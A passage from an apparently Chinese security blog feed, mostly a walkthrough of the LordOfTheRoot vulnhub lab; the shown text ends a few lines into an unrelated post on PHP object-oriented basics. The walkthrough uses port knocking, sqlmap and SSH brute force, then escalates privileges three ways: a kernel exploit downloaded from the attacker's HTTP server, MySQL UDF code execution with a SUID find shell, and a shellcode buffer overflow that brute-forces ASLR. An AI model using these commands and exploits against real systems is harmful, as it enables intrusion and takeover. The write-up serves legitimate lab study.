-p <span class="variable">$port</span>;<span class="keyword">done</span></span><br></pre></td></tr></table></figure><ul><li><p>for port in $(seq 1 3)：这是一个for循环语句，它将变量port设置为从1到3的序列。这意味着循环将执行三次，每次将port设置为1、2和3。</p></li><li><p>do nmap 192.168.0.4 -p $port &amp;：在循环体中，执行nmap命令。192.168.0.4是目标主机的IP地址。-p $port指定要扫描的端口，变量$port将在每次循环时被替换为当前的端口值。&amp;符号表示在后台运行nmap命令，以便并行执行多个扫描。</p></li><li><p>done：循环结束的标记。</p></li></ul><h2 id="访问端口服务"><a href="#访问端口服务" class="headerlink" title="访问端口服务"></a>访问端口服务</h2><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426144646234.png" alt="image-20240426144646234"></p><p>只有一张图片，但提示了mordor，尝试访问一下这个目录</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426144733009.png" alt="image-20240426144733009"></p><p>又是只有一张图THE BLACK GATEIS TOO MAINSTREAM，查看源代码，发现一串加密的字符串</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--THprM09ETTBOVEl4TUM5cGJtUmxlQzV3YUhBPSBDbG9zZXIh&gt;--&gt;</span></span><br></pre></td></tr></table></figure><p>方cmd5去跑一下，查询结果是</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">Lzk3ODM0NTIxMC9pbmRleC5waHA= Closer!</span><br></pre></td></tr></table></figure><p>左边的一串也类似加密的字符串，再跑一遍</p><figure class="highlight tex"><table><tr><td class="code"><pre><span class="line">/978345210/index.php</span><br></pre></td></tr></table></figure><p>得到一个目录，尝试访问一下</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426145119047.png" alt="image-20240426145119047"></p><p>发现是一个登陆界面，直接用sqlmap试试，抓包，保存，-r</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426162217794.png" alt="image-20240426162217794"></p><p>发现不知道要跑多久，搜了下，换了个参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --tables --threads=10 --batch</span><br></pre></td></tr></table></figure><p>爆出来个User表</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -r 1.txt -D Webapp --dump -T Users --threads=10 --batch</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426165336227.png" alt="image-20240426165336227"></p><p>发现了用户名和密码，明文存取，试试登陆，每一个好像都是一样图片，试试用这些账号远程登陆试试，可以用hydra，先把这些账号密码分别保存到txt文件中</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hydra -L username.txt -P password.txt ssh://192.168.174.151</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426170701782.png" alt="image-20240426170701782"></p><p>发现第二个账号是可以登陆的，用它登陆上去试试</p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="利用内核漏洞提取39166-c"><a href="#利用内核漏洞提取39166-c" class="headerlink" title="利用内核漏洞提取39166.c"></a>利用内核漏洞提取39166.c</h3><p><strong>uname -a</strong><br>Linux LordOfTheRoot 3.19.0-25-generic #26~14.04.1-Ubuntu SMP Fri Jul 24 21:18:00 UTC 2015 i686 i686 i686 GNU&#x2F;Linux</p><p>发现是ubuntu14.04，去找找有什么能够利用的漏洞，发现一个Ubuntu特权提升漏洞（CVE-2021-3493），去试试。操作不允许。。。看下wp用的是啥，在msf里找,带39166.c的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit Ubuntu 14.04</span><br></pre></td></tr></table></figure><p>然后把他复制过来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit -m 39166.c</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426222616464.png" alt="image-20240426222616464">然后在复制的地方搭建个一句话服务器</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -m http.server 9966</span><br><span class="line">wget http://192.168.174.137:9966/39166.c</span><br><span class="line"><span class="comment">#然后</span></span><br><span class="line">gcc 39166.c -o 39166</span><br><span class="line">./39166</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426222841696.png" alt="image-20240426222841696"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /root</span><br><span class="line">cat Flat.txt</span><br><span class="line">“There is only one Lord of the Ring, only one who can bend it to his will. And he does not share power.”</span><br><span class="line">– Gandalf</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426223158566.png" alt="image-20240426223158566"></p><h3 id="另一种方法-使用mysql提权"><a href="#另一种方法-使用mysql提权" class="headerlink" title="另一种方法:使用mysql提权"></a>另一种方法:使用mysql提权</h3><p>查看mysql 的版本</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -aux | grep mysql</span><br><span class="line">mysql --version</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426224959010.png" alt="image-20240426224959010"></p><p>查看mysql 数据库的root密码,这个可以去网站连接数据库的命令查看</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426225137108.png" alt="image-20240426225137108"></p><p>root:darkshadow</p><p>看看可以不以使用UDF提权，因为mysql是root用户运行的，如果我们提权成功，将获得root权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -uroot -pdarkshadow</span><br></pre></td></tr></table></figure><p>进入数据库后，看看secure_file_priv的配置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出文件，此时无法提权</span><br><span class="line"> 当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出文件只能发生在 /tmp/ 目录下，此时也无法提权</span><br><span class="line"> 当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出文件做限制，此时可提权</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426225755198.png" alt="image-20240426225755198"></p><p>查看主机版本及数据库架构</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;%compile%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426225843760.png" alt="image-20240426225843760"></p><p>因数据库为i6886,要使用32位udf文件</p><p>查看plugin目录地址，此处为上传udf文件地址</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">show</span> variables <span class="keyword">like</span> <span class="string">&#x27;plugin%&#x27;</span>;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426225930605.png" alt="image-20240426225930605"></p><p>&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</p><p>可以在msf的&#x2F;usr&#x2F;share&#x2F;metasploit-framework&#x2F;data&#x2F;exploits&#x2F;mysql下，找到udf文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /usr/share/metasploit-framework/data/exploits/mysql</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426230405789.png" alt="image-20240426230405789"></p><p>将文件复制出来，因为是32位架构，所以使用lib_mysqludf_sys_32.so</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp lib_mysqludf_sys_32.so /root</span><br></pre></td></tr></table></figure><p>再搭一个一句话服务器9966端口，然后在靶机上下载</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://192.168.174.137:9966/lib_mysqludf_sys_32.so</span><br></pre></td></tr></table></figure><p>然后连接数据库，进入一个库，我这里用的是mysql</p><p>创建一个表，用来存储udf文件内容</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> foo(line blog);</span><br></pre></td></tr></table></figure><p>在MySQL中Blob是一个二进制的对象,Blob类型  最大能容纳65KB的</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426232307745.png" alt="image-20240426232307745"></p><p>将udf文件插入到temp表中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into foo(line) values (load_file(&#x27;/home/smeagol/lib_mysqludf_sys_32.so&#x27;));</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426232545078.png" alt="image-20240426232545078"></p><p>在&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;目录下，新建一个udf32.so文件，将表中数据存入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select line from foo into dumpfile &quot;/usr/lib/mysql/plugin&quot;;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426233332384.png" alt="image-20240426233332384"></p><p>将udf32.so文件导入数据库，定义一个函数名称sys_eval</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reate function sys_eval returns string soname &#x27;udf32.so&#x27;;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426233640781.png" alt="image-20240426233640781"></p><p>使用sys_eval函数，执行linux命令</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426233709376.png" alt="image-20240426233709376"></p><p>提权成功，给find命令赋予普通用户使用可以暂时获取root用户使用权限</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_eval(&#x27;chmod u+s /usr/bin/find&#x27;);</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426234038902.png" alt="image-20240426234038902"></p><p>通过find命令的 exec参数，获取root的shell</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find ./ 1.txt -<span class="built_in">exec</span> <span class="string">&#x27;/bin/sh&#x27;</span> \;</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240426234322595.png" alt="image-20240426234322595"></p><h3 id="法三：缓冲区溢出提权"><a href="#法三：缓冲区溢出提权" class="headerlink" title="法三：缓冲区溢出提权."></a><strong>法三</strong>：<a href="https://www.freebuf.com/articles/network/325745.html">缓冲区溢出提权</a>.</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls -lahR</span><br></pre></td></tr></table></figure><ul><li><strong>ls</strong> -a           <em># 显示当前目录中的所有文件和目录，包括隐藏文件</em></li><li><strong>ls</strong> -lh          <em># 以人类可读的方式显示当前目录中的文件和目录大小</em></li><li><strong>ls</strong> -R           <em># 递归显示当前目录中的所有文件和子目录</em></li></ul><p>学到一个批量看文件的命令</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427224437242.png" alt="image-20240427224437242"></p><p>这个文件是放在&#x2F;SECRET&#x2F;door3的file的文件,可以用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./file $(python -c &#x27;print&#x27; &quot;A&quot;*200&#x27;)</span><br></pre></td></tr></table></figure><p>测试</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427224801334.png" alt="image-20240427224801334"></p><p>这里使用gdb工具进行调试</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb -q ./file</span><br></pre></td></tr></table></figure><p>既然在测试中200个字节就已经产生了溢出，那就先去生成一个不重复的两百的字节大小的字符串,这里用msf中的pattern_create.rb构造</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">locate pattern_</span><br><span class="line">cd /usr/share/metasploit-framework/tools/exploit </span><br><span class="line">./pattern_create.rb -l 200</span><br><span class="line">Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</span><br><span class="line">/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb</span><br><span class="line">这两个脚本是专门用来作为缓冲区溢出查找偏移量的</span><br></pre></td></tr></table></figure><p>然后把这个字符串作为参数，放到gdb里run一下</p><p>走到这里和攻略不一样了，<a href="https://www.freebuf.com/vuls/343808.html">先换一种方法</a></p><p>在之前查看文件的基础上，可以发现间隔了几分钟后，我们再次查看，发现文件大小发生了变化</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427225956360.png" alt="image-20240427225956360"></p><p>一开始door1的file是7.2，door2的file是5.1，现在door1的是5.1，door2的是7.1</p><p>时使用ldd命令查看file ldd（查看依赖情况）</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427230232377.png" alt="image-20240427230232377"></p><p>这个是因为存在一个防护机制ASLR，我们查看ASLR设置</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/sys/kernel/randomize_va_space</span><br><span class="line">或</span><br><span class="line">sysctl -a --pattern randomize</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427230333280.png" alt="image-20240427230333280"></p><p>返回2</p><p>0 &#x3D; 关闭</p><p>1 &#x3D; 半随机。共享库、栈、mmap() 以及 VDSO 将被随机化。（留坑，PIE会影响heap的随机化。。）</p><p>2 &#x3D; 全随机。除了1中所述，还有heap。</p><p>如果没有设置ASLR的话，ldd看到的值也都是固定的</p><p><strong>注意：这里的ASLR设置并不等于上文所说root权限下执行的那个py文件，switcher.py每三分钟变换一次值，相当于这是两道防护，让溢出的难度变得更大</strong></p><p><strong>绕过ASLR的一种方法是通过编写一个自动循环脚本（循环攻击，总会攻击到溢出的那个点）来强制堆栈，接下来要放入payload需要进行nop sled来爆破一个空间出来</strong></p><p>现在的情况就是，<strong>缓冲区溢出的文件随机，空间也随机</strong></p><p>对于溢出来说，有几个点：</p><ol><li>首先，溢出的点在哪里（偏移量&#x2F;溢出值）</li><li>溢出后，后面的空间有多大，放合适的恶意代码进去</li><li>绕过安全保护机制</li></ol><p>首先我们找到那个5.1k的file，然后把他搞到kali里面</p><p>我这里直接base64编码复制出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">base64 file</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427230658503.png" alt="image-20240427230658503"></p><p>复制放到本地的一个文本中，并且复原成file,然后解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat 1.txt | base64 -d &gt; file</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427230953611.png" alt="image-20240427230953611"></p><p>此时在确定file是5.1k的情况下查看<strong>md5值</strong>，与kali里的进行对比</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5sum file</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427231057051.png" alt="image-20240427231057051"></p><p>可以发现是一样的，这里也使用GDB进行分析，博主推荐两个插件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg和peda</span><br></pre></td></tr></table></figure><p>下面就是调试了</p><p>先授予权限并执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x file </span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427231812796.png" alt="image-20240427231812796"></p><p>当把值加大后，回显段报错，用之前用的的方法生成个1000位值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./patern_create.rb -l 1000</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427232203712.png" alt="image-20240427232203712"></p><p>再使用GDB执行值</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427233451400.png" alt="image-20240427233451400"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427232335848.png" alt="image-20240427232335848"></p><p>然后发现之前方法可以继续下去了，可能是环境没调好</p><p>这两个工具是对应的，识别溢出点，上面脚本的找到错误点，下面的脚本找到位置</p><p>0x41376641 in ?? ()</p><p>查看到错误点在41376641</p><p><strong>分析错误点判断偏移量</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./pattern_offset.rb -q 41376641</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427232550038.png" alt="image-20240427232550038"></p><p>得到偏移位置171</p><p><strong>尝试在偏移量171溢出后情况</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb$run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4)&#x27;)</span><br><span class="line">//我感觉明白前面不行是为什么了，我这里要加括号,python3print变成fun必须+括号</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427233917963.png" alt="image-20240427233917963"></p><p>ESP：栈指针寄存器(extended stack pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的栈顶。ESP就是前面说的，始终指向栈顶，只要ESP指向变了，那么当前栈顶就变了。</p><p>EBP：基址指针寄存器(extended base pointer)，其内存放着一个指针，该指针永远指向系统栈最上面一个栈帧的底部。EBP存储着当前函数栈底的地址，栈底通常作为基址，我们可以通过栈底地址和偏移相加减来获取变量地址（很重要）。</p><p>EIP存储着下一条指令的地址，每执行一条指令，该寄存器变化一次。</p><p>可以说如果控制了EIP寄存器的内容，就控制了进程——我们让EIP指向哪里，CPU就会去执行哪里的指令。</p><p><strong>Nop空间测试ESP</strong></p><p>由于开启了ASLR机制，需要进行nop sled来爆破一个空间出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run $(python -c &#x27;print(&quot;A&quot; * 171 + &quot;B&quot; * 4 + &quot;\x90&quot; * 2000)&#x27;)</span><br></pre></td></tr></table></figure><p>写入171个A之后，写入4个B，之后写入90</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240427234217740.png" alt="image-20240427234217740"></p><p>我们成功的控制了eip中的内容，ESP就是我们溢出之后执行shellcode的地方</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x/s $esp</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240428104020602.png" alt="image-20240428104020602"></p><p>0xffffbf30这是nop sled的地址开始处，当ESP指向该地址处后，就会执行栈堆空间的payload获得shell</p><p>这里做到后面做错了。。。不能在本机跑。。。，内存都不一样了。。。</p><p>那我们往eip填写的数据需要是‘0xbfd37c50:’,记得倒序</p><p>看wp，作者在&#x2F;SECRET中执行的代码，这三次代码相同，但是每次esp地址却不同，甚至第三次他又没产生溢出漏洞，这就是我们上面讲的ASLR，他的地址在动态变化，防止我们制造出溢出漏洞，我想们需要饶过他</p><p>假设他每次地址都在随机变化，那我们只要指定一个地址填充到eip中，并不断执行构造溢出，那是不是他终究会出现随机到和我们指定的地址相同这种情况，时不时就会执行我们的shellcode</p><p>编写exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/bin/python</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">buf=<span class="string">&quot;A&quot;</span>*<span class="number">171</span></span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="comment">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span></span><br><span class="line">shell=buf+<span class="string">&quot;\x40\xee\xff\xbf&quot;</span>+<span class="string">&quot;C&quot;</span>*<span class="number">20000</span>+<span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):</span><br><span class="line">        os.system(<span class="string">&#x27;./file&#x27;</span>+<span class="string">&quot; &quot;</span>+shell)</span><br></pre></td></tr></table></figure><p>由于esp地址前两位一直是bf所以我们前两位不变，剩下六位随便填，不要填\x00就行，他有特殊含义不能被正确识别</p><p>代码中被注释的是我从其他作者文章中复制过来的，可以直接在shell中执行</p><p>执行命令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#for a in &#123;1..1000&#125;; do ./file $(python -c &#x27;print &quot;A&quot; * 171 + &quot;\x40\xee\xff\xbf&quot; + &quot;\x90&quot; * 2000 + &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80&quot;&#x27;); done</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240428163407372.png" alt="image-20240428163407372"></p><p>终于成了。。。。</p><p>这里有个问题是，root目录下有个switcher.py文件，会让产生缓冲区溢出的文件发生变化</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import os</span><br><span class="line">from random import randint</span><br><span class="line"></span><br><span class="line">targets= [&quot;/SECRET/door1/&quot;,&quot;/SECRET/door2/&quot;,&quot;/SECRET/door3/&quot;]</span><br><span class="line">for t in targets:</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">   os.system(&quot;cp -p other &quot;+t)</span><br><span class="line">   os.system(&quot;cp -p &quot;+t+&quot;other &quot;+t+&quot;file&quot;)</span><br><span class="line">   os.system(&quot;rm &quot;+t+&quot;other&quot;)</span><br><span class="line"></span><br><span class="line">luckyDoor = randint(0,2)</span><br><span class="line">t=targets[luckyDoor]</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;*&quot;)</span><br><span class="line">os.system(&quot;cp -p buf &quot;+t)</span><br><span class="line">os.system(&quot;cp -p &quot;+t+&quot;buf &quot;+t+&quot;file&quot;)</span><br><span class="line">os.system(&quot;rm &quot;+t+&quot;buf&quot;)</span><br></pre></td></tr></table></figure><p>有时候不行的话，可以回去看下存在溢出的文件有没有发生变化</p>]]></content>
      
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> vulhub </tag>
            
            <tag> 缓冲区溢出 </tag>
            
            <tag> udf提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化</title>
      <link href="/2024/04/18/php-SER-libs/"/>
      <url>/2024/04/18/php-SER-libs/</url>
      
        <content type="html"><![CDATA[<h1 id="php面像对象基本知识"><a href="#php面像对象基本知识" class="headerlink" title="php面像对象基本知识"></a>php面像对象基本知识</h1><p>对象的三个特征：对象的行为、对象的形态、对象的表示</p><p>类的定义：类是定义了一件事物的抽象特点，它将数据的形式以及这些数据<br>上的操作封装在一起。</p><p>对象是具有类类型的变量，是对类的实例。</p><p>内部构成：成员变量(属性) +成员函数（方法）</p><p>成员变量：定义在类内部的变量。该变量的值对外是不可见的但是可以通过成员函数访问在类被实例化为对象后，该变量即可成为对象的属性。</p><p>成员函数：定义在类的内部可用于访问对象的数据。</p><p>继承:继承性是子类自动共享父类数据结构和方法的机制，是类之间的一种关系。</p><p>在定义和实现一个类的时候，可以在一个已经存在的类的基础之上来进行，把一个已经存在的类所定义的内容作为自己的内容，并加入若干新的内容。</p><h2 id="类于对象"><a href="#类于对象" class="headerlink" title="类于对象"></a>类于对象</h2><h3 id="类的结构"><a href="#类的结构" class="headerlink" title="类的结构"></a>类的结构</h3><p>类:定义类名、定义成员变量(属性)、定义成员函数(方法)</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Class_Name</span></span>&#123;</span><br><span class="line">    <span class="comment">//成员变量声明</span></span><br><span class="line">    <span class="comment">//成员函数声明</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>创建一个类:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123; <span class="comment">//定义类(类名)</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$name</span>;<span class="comment">//生命成员变量</span></span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123; <span class="comment">//声明成员方法</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name; <span class="comment">//使用预定义$this调用成员变量</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$var1</span>; <span class="comment">// 成员函数传参$var1可以直接调用</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="实例化和复制"><a href="#实例化和复制" class="headerlink" title="实例化和复制"></a>实例化和复制</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$sex</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>(); <span class="comment">//实例化类hero()为对象cyj</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;name=<span class="string">&#x27;chengyaojin&#x27;</span>;<span class="comment">//参数赋值</span></span><br><span class="line"><span class="variable">$cyj</span>-&gt;sex=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line"><span class="variable">$cyj</span>-&gt;<span class="title function_ invoke__">jineng</span>(<span class="string">&#x27;zuofan&#x27;</span>);<span class="comment">//嗲用函数</span></span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$cyj</span>);<span class="comment">//打印对象</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="类的修饰符介绍"><a href="#类的修饰符介绍" class="headerlink" title="类的修饰符介绍"></a>类的修饰符介绍</h3><p>在类中直接声明的变量称为成员属性(也可以成为成员变量)</p><p>可以在类中声明多个变量，即“对象”中可以有多个成员属性，每个变量都存储“对象”不同的属性信息。</p><p>访问权限修饰符:对属性的定义</p><p>常用访问权限修饰符:</p><p>​public:公共的，在类的内部、子类中或者类的外部都可以使用，不受限制;</p><p>​protected:受保护的，在类的内部、子类中可以使用，但不能在类的外部使用;</p><p>​private:私有的，只能在类的内部使用，在类的外部或者子类中都无法使用。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span>  <span class="variable">$name</span>=<span class="string">&#x27;chengyaojin&#x27;</span>; <span class="comment">//外部可用</span></span><br><span class="line">  <span class="keyword">private</span>  <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;<span class="comment">//外部不可用</span></span><br><span class="line">  <span class="keyword">protected</span>  <span 